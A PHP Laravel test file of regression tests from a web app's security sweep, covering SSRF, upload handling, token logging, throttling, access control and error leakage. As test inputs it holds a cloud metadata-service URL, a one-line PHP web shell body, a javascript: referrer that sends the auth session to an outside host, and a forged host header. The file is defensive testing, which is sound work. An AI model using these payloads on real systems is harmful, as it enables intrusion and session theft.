<?php

namespace Tests\Feature;

use App\Http\Middleware\CheckCredits;
use App\Http\Middleware\RestrictFreePlan;
use App\Jobs\GenerateCopyThumbnailJob;
use App\Mail\PasswordResetMail;
use App\Mail\VerifyEmailMail;
use App\Models\AiModel;
use App\Models\Prompt;
use App\Models\PromptType;
use App\Models\Role;
use App\Models\Thumbnail;
use App\Models\User;
use App\Services\StripeService;
use App\Support\SafeHttp;
use App\Support\UserSafeError;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Log\Events\MessageLogged;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Event;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Queue;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Storage;
use Tests\TestCase;

/**
 * Batch 1 of the 2026-10-12 security sweep (tasks/todo.md). One test per
 * finding, each written to fail on the pre-fix code.
 */
class SecuritySweepTest extends TestCase
{
    use RefreshDatabase;

    private function bearer(User $user): array
    {
        return ['Authorization' => 'Bearer '.$user->createToken('mobile-app')->plainTextToken, 'Accept' => 'application/json'];
    }

    /** Every log line written while $fn runs, flattened to one searchable string. */
    private function logsDuring(callable $fn): string
    {
        $lines = [];
        Event::listen(MessageLogged::class, function (MessageLogged $e) use (&$lines) {
            $lines[] = $e->message.' '.json_encode($e->context);
        });
        $fn();

        return implode("\n", $lines);
    }

    private function png(): string
    {
        return base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==');
    }

    // ── C1: import-from-URL ─────────────────────────────────────────────────

    private function copyFromUrl(User $user, string $url)
    {
        return $this->withoutMiddleware([CheckCredits::class, RestrictFreePlan::class])
            ->withHeaders($this->bearer($user))
            ->postJson('/api/thumbnails/copy', ['source_image_url' => $url]);
    }

    public function test_url_import_refuses_the_metadata_service_and_stores_nothing(): void
    {
        Storage::fake('public');
        Queue::fake();
        Http::fake();

        $this->copyFromUrl(User::factory()->create(), 'http://169.254.169.254/latest/meta-data/')
            ->assertStatus(400);

        Http::assertNothingSent();
        $this->assertSame([], Storage::disk('public')->allFiles());
    }

    public function test_url_import_never_keeps_a_php_extension_from_the_url(): void
    {
        Storage::fake('public');
        Queue::fake();
        SafeHttp::resolveUsing(fn () => ['93.184.216.34']);
        Http::fake(['https://evil.test/s.php' => Http::response($this->png(), 200, ['Content-Type' => 'image/png'])]);

        $this->copyFromUrl(User::factory()->create(), 'https://evil.test/s.php')->assertCreated();

        $files = Storage::disk('public')->allFiles();
        $this->assertCount(1, $files);
        $this->assertStringEndsWith('.png', $files[0]);
        SafeHttp::resolveUsing(null);
    }

    public function test_url_import_refuses_a_non_image_body(): void
    {
        Storage::fake('public');
        Queue::fake();
        SafeHttp::resolveUsing(fn () => ['93.184.216.34']);
        Http::fake(['https://evil.test/s.php' => Http::response('<?php system($_GET["c"]);', 200, ['Content-Type' => 'image/png'])]);

        $this->copyFromUrl(User::factory()->create(), 'https://evil.test/s.php')->assertStatus(400);

        $this->assertSame([], Storage::disk('public')->allFiles());
        Queue::assertNotPushed(GenerateCopyThumbnailJob::class);
        SafeHttp::resolveUsing(null);
    }

    // ── H10: uploaded files keep a content-derived extension ───────────────

    public function test_uploads_are_named_by_their_content_not_the_client_filename(): void
    {
        Storage::fake('public');
        Queue::fake();
        // Real files (not UploadedFile::fake, which takes the MIME from the name)
        // so the content is sniffed the way it is in production.
        $real = function (string $clientName): UploadedFile {
            $path = tempnam(sys_get_temp_dir(), 'up');
            file_put_contents($path, $this->png());

            return new UploadedFile($path, $clientName, null, null, true);
        };

        $this->withoutMiddleware([CheckCredits::class, RestrictFreePlan::class])
            ->withHeaders($this->bearer(User::factory()->create()))
            ->post('/api/thumbnails/copy', ['source_image' => $real('x.html'), 'reference_image' => $real('r.svg')], ['Accept' => 'application/json'])
            ->assertCreated();

        $this->assertCount(2, Storage::disk('public')->allFiles());

        foreach (Storage::disk('public')->allFiles() as $file) {
            $this->assertStringEndsWith('.png', $file);
        }
    }

    // ── H1: secrets never reach the logs ────────────────────────────────────

    public function test_password_reset_mail_does_not_log_the_token(): void
    {
        $token = 'reset-token-'.str_repeat('a', 40);

        $logs = $this->logsDuring(fn () => (new PasswordResetMail($token, 'u@example.com'))->render());

        $this->assertStringNotContainsString($token, $logs);
    }

    public function test_youtube_exchange_does_not_log_the_bearer_token(): void
    {
        $user = User::factory()->create();
        $token = $user->createToken('mobile-app')->plainTextToken;

        $logs = $this->logsDuring(fn () => $this->withHeaders(['Authorization' => 'Bearer '.$token, 'Accept' => 'application/json'])
            ->postJson('/api/auth/youtube/exchange', ['code' => 'x']));

        $this->assertStringNotContainsString(explode('|', $token)[1], $logs);
    }

    // ── H2: reset tokens expire ─────────────────────────────────────────────

    public function test_a_password_reset_token_older_than_an_hour_is_refused(): void
    {
        $user = User::factory()->create();
        $token = $user->createPasswordResetToken();
        DB::table('password_reset_tokens')->where('email', $user->email)->update(['created_at' => now()->subHours(5)]);

        $this->postJson('/api/reset-password', ['email' => $user->email, 'token' => $token, 'password' => 'NewPassword123!', 'password_confirmation' => 'NewPassword123!'])
            ->assertStatus(400);

        $this->assertFalse(Hash::check('NewPassword123!', $user->fresh()->password));
    }

    public function test_a_fresh_password_reset_token_still_works(): void
    {
        $user = User::factory()->create();
        $token = $user->createPasswordResetToken();

        $this->postJson('/api/reset-password', ['email' => $user->email, 'token' => $token, 'password' => 'NewPassword123!', 'password_confirmation' => 'NewPassword123!'])
            ->assertOk();
    }

    // ── H3: sign-in endpoints are throttled ─────────────────────────────────

    public function test_login_is_throttled_per_email(): void
    {
        $user = User::factory()->create();

        for ($i = 0; $i < 5; $i++) {
            $this->postJson('/api/login', ['email' => $user->email, 'password' => 'wrong'])->assertStatus(401);
        }

        $this->postJson('/api/login', ['email' => $user->email, 'password' => 'wrong'])->assertStatus(429);
    }

    public function test_web_login_is_throttled(): void
    {
        $user = User::factory()->create();
        for ($i = 0; $i < 5; $i++) {
            $this->post('/login', ['email' => $user->email, 'password' => 'wrong']);
        }

        $this->post('/login', ['email' => $user->email, 'password' => 'wrong'])->assertStatus(429);
    }

    public function test_reset_and_verification_emails_are_throttled_per_address(): void
    {
        Mail::fake();

        // One budget per inbox, shared by every endpoint that mails it; a fresh address per endpoint here.
        foreach (['/api/forgot-password', '/api/auth/resend-verification'] as $endpoint) {
            $user = User::factory()->unverified()->create();
            for ($i = 0; $i < 3; $i++) {
                $this->postJson($endpoint, ['email' => $user->email])->assertSuccessful();
            }
            $this->postJson($endpoint, ['email' => $user->email])->assertStatus(429);
        }
    }

    // ── H4: tracked referrers can't carry script ────────────────────────────

    public function test_pixel_drops_non_http_referrers(): void
    {
        $owner = User::factory()->create(['public_id' => (string) \Illuminate\Support\Str::uuid()]);

        $this->postJson('/api/track/pageview', [
            'public_id' => $owner->public_id,
            'visitor_id' => (string) \Illuminate\Support\Str::uuid(),
            'url' => 'https://site.example/a',
            'referrer' => "javascript://evil.com/%0Afetch('//x/?'+localStorage.auth_session)",
        ])->assertSuccessful();

        $this->assertDatabaseMissing('tracking_page_views', ['referrer' => "javascript://evil.com/%0Afetch('//x/?'+localStorage.auth_session)"]);
    }

    // ── H5: global AI prompts are admin-only ────────────────────────────────

    public function test_only_admins_can_edit_the_shared_ai_prompts(): void
    {
        $type = PromptType::create(['name' => 'style', 'display_name' => 'Style']);
        $prompt = Prompt::create(['prompt_type_id' => $type->id, 'name' => 'Default', 'text' => 'original', 'is_active' => true]);

        $this->withHeaders($this->bearer(User::factory()->create()))
            ->putJson("/api/prompts/{$prompt->id}", ['text' => 'hijacked'])
            ->assertForbidden();
        $this->assertSame('original', $prompt->fresh()->text);

        $admin = User::factory()->create();
        $admin->roles()->attach(Role::firstOrCreate(['name' => 'admin'], ['display_name' => 'Admin'])->id);
        $this->withHeaders($this->bearer($admin))
            ->putJson("/api/prompts/{$prompt->id}", ['text' => 'updated'])
            ->assertOk();
    }

    // ── H6: another user's face model can't be used ─────────────────────────

    public function test_thumbnails_cannot_use_another_users_ai_model(): void
    {
        Queue::fake();
        $owner = User::factory()->create();
        $model = AiModel::create(['user_id' => $owner->id, 'name' => 'Owner face', 'status' => 'completed', 'trigger_word' => 'ohwx']);

        $this->withoutMiddleware([CheckCredits::class, RestrictFreePlan::class])
            ->withHeaders($this->bearer(User::factory()->create()))
            ->postJson('/api/thumbnails', ['description' => 'A thumbnail', 'ai_model_id' => $model->id])
            ->assertStatus(422);

        $this->assertSame(0, Thumbnail::count());
    }

    // ── H7: a Stripe subscription only activates for its own customer ──────

    public function test_a_subscription_belonging_to_another_customer_is_refused(): void
    {
        $user = User::factory()->create(['stripe_customer_id' => 'cus_mine']);
        $this->mock(StripeService::class, function ($m) {
            $m->shouldReceive('getSubscription')->with('sub_theirs')->andReturn(['id' => 'sub_theirs', 'customer' => 'cus_someone_else', 'status' => 'active']);
        });

        $this->withHeaders($this->bearer($user))
            ->postJson('/api/user-plans/subscribe', ['stripe_subscription_id' => 'sub_theirs'])
            ->assertForbidden();

        $this->assertSame(0, $user->plans()->count());
    }

    // ── H8: emailed links never take their host from the request ────────────

    public function test_verification_links_ignore_a_forged_host_header(): void
    {
        Mail::fake();
        $user = User::factory()->unverified()->create(['signup_source' => User::SIGNUP_SOURCE_AGENT]);

        $this->postJson('http://evil.test/api/auth/resend-verification', ['email' => $user->email]);

        $mail = Mail::sent(VerifyEmailMail::class)->sole();
        $this->assertStringNotContainsString('evil.test', $mail->verifyUrl);
        $this->assertStringStartsWith(rtrim(config('app.url'), '/').'/verify-email', $mail->verifyUrl);
    }

    // ── H9: exception text stays out of API responses ───────────────────────

    public function test_unhandled_api_errors_return_a_generic_message_in_production(): void
    {
        config(['app.debug' => false]);
        Route::middleware('api')->get('/api/__boom', fn () => throw new \PDOException('SQLSTATE[08006] host=db.internal password=hunter2'));

        $response = $this->getJson('/api/__boom')->assertStatus(500);

        $this->assertStringNotContainsString('db.internal', $response->getContent());
        $this->assertStringNotContainsString('hunter2', $response->getContent());
    }

    public function test_error_detail_hides_framework_exception_text_unless_debugging(): void
    {
        config(['app.debug' => false]);
        $this->assertNull(UserSafeError::detail(new \PDOException('SQLSTATE host=db.internal')));
        $this->assertSame('Video not found', UserSafeError::detail(new \RuntimeException('Video not found')));
        $this->assertSame('Your card was declined.', UserSafeError::detail(\Stripe\Exception\CardException::factory('Your card was declined.')));
        $this->assertSame('Failed to start subscription.', UserSafeError::withDetail('Failed to start subscription: ', new \PDOException('SQLSTATE host=db.internal')));

        config(['app.debug' => true]);
        $this->assertSame('SQLSTATE host=db.internal', UserSafeError::detail(new \PDOException('SQLSTATE host=db.internal')));
    }
}
